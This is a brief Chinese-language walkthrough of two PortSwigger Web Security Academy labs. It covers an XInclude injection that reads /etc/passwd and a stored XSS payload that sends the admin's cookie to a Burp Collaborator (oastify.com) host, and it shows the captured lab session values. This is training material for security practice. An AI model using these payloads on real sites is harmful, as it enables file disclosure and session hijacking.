## 扫描特定请求

实验：通过定向扫描快速发现漏洞 | Web 安全学院
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning

对检查库存功能使用burp扫描器
检测到xml include注入

使用xml include构建攻击向量
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
**XInclude 中，parse="text" 属性指示解析器将包含的文件内容作为纯文本处理**
若省略则作为xml格式文件，服务器返回 "Content is not allowed in prolog"






## 扫描非标准数据结构

实验：扫描非标准数据结构
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures

登录的响应为
Cookie: session=wiener%3a7y860auXvqrGljFTJQO8thROyZ9q6siQ
url解码后为
Cookie: session=wiener:7y860auXvqrGljFTJQO8thROyZ9q6siQ

选择 wiener 字段，使用burp的 扫描选定的插入点
不同于解决方案中描述的1分钟延迟，实际上延迟了6分钟得到 储存型XSS 报告
扫描器载荷为
'"><svg/onload=fetch`//nmder9mixhs7h23l9op5jv6cx33wrmfe52wsji77\.oastify.com`>

构建载荷以窃取管理员 cookie
'"><svg/onload=fetch("//k4pxt351awy5v6wu9p8vheh0prvij87x.oastify.com/?xss="+document.cookie)>

得到
session=administrator:ARdPNvBqrmodrfkeUQhtvczCHRcVa4G5; 
secret=gCHVK6RqViZIDuCsjvnzYVGaEnObsMNy;

示例解决方案：
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>
